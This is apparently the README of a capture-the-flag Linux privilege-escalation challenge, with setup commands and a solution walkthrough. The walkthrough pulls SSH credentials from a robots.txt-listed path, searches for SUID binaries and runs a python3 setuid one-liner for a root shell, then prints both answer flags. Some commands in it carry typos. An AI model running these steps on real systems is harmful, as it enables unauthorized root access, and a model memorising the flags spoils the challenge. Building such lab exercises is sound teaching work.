# DevSec? Overrated... (1 & 2)
- Author: [supasuge](https://github.com/supasuge) | Evan Pardon
- Category: Web Linux System Exploitation
- Tags: *Linux System Exploitation* | *Linux Privilege Escalation*

**Challenge Rules**

1. Do not make changes to the file system, or use automated scripts to escalate privileges/find weaknesses. `find`, and `python3` is all you need.
  - Protections have been put in place to make the file system immutable/non-readable (with the exception of the `user`/`root` flag's of course), however this is easily over-ridden once privileges are escalated to the root user.
2. No bruteforcing/credential stuffing. The use of any automated web fuzzers such as `ffuf`/`gobuster` is not allowed for this challenge and is very unnecessary.
  - `fail2ban` + strict SSH login policies enforced. (fail2ban yet to be added to Dockerfile config)

## Description

**Challenge Description for production**

Developer security operations? Blame it on the robots... those dang tin cans never know when to keep their mouth shut. Rumor has it SSH credentials are exposed on the web server. As our in-house penetration tester, it's your job to find this weakness and login to the server and attempt privilege escalation. For part 1, submit the flag found under: `/home/ctfuser/user.txt`, for part 2 submit the flag found under: `/root/root.txt` after escalating privileges. 

> Note: Credential stuffing/bruteforcing of any kind is not allowed in this challenge. This includes tools such as `hydra`, `ffuf`, `gobuster`, `feroxbuster` and many more. Failure to comply will result in possible disqualification or a point penalty depending on circumstances.

---

**Challenge Description for internal use**

This challenge feature's a website running on port `8000` of the container served simply via `nginx`. The goal of this challenge is to check `robots.txt` for any hidden endpoints, from which point you'll see multiple hidden endpoints; one of which (`/admin/credentials.txt`) contains the Username/Password to SSH onto the server (`2222`).

To get Flag 1 (Pt.1), simply submit the user flag found in `user.txt`.

To get Flag 2 (Pt.2), find a way to escalate your privileges to the root user and submit the root flag in `root.txt`.

## Build

```bash
cd build
docker build -t devsec-nope .
```

## Run

- The command below will use port `8000` for the website, and `2222` for the SSH Server. If you wish to change the port, do so by changing the corresponding values below. The [build/Dockerfile](https://github.com/cyberOU/GrizzHacks7-CTF/blob/main/Web/DevSec-no-thanks-1-and-2/build/build/Dockerfile) exposes port `80` (HTTP) and `22` (OpenSSH).


```bash
docker run -d -p 8000:80 -p 2222:22 devsec-nope:latest
```

## Solution

##### Pt.1

To get a shell as `ctfuser`:
1. View `robots.txt` to find hidden/non-indexed endpoints.
2. Find credentials under `/admin/credentials.txt`
3. SSH to the server as `ctfuser`
4. Get the flag in `user.txt`

##### Pt.2

Shell as `root`:
1. Search for SUID binaries: `find / -perm -4000 2>&/dev/null`
2. Locate the SUID python binary, then run: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")` to successfully escalate your privileges and get a shell as the root user.
3. Get the final flag in `root.txt`

### Output from Testing

```bash
❯ ssh ctfuser@localhost -p 2222
ctfuser@localhost's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.13.4-arch1-1 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctfuser@84b04e070f2c:~$ python3 -c 'import s os; os.setuid(0);os.system("/bin/bash")'
root@84b04e070f2c:~# whoami
root
root@84b04e070f2c:~# ls
user.txt
root@84b04e070f2c:~# pwd
/home/ctfuser
root@84b04e070f2c:~# cat user.txt
GrizzCTF{us3r_pwn3d_n01 c3_j0b_w4tch_0ut_4_pyth0ns}
root@84b04e070f2c:~# cd /root
root@84b04e070f2c:/root# cat root.txt
GrizzCTF{DevSec_Inf0S3c_00ps13_pwn3d_n01c3}
```
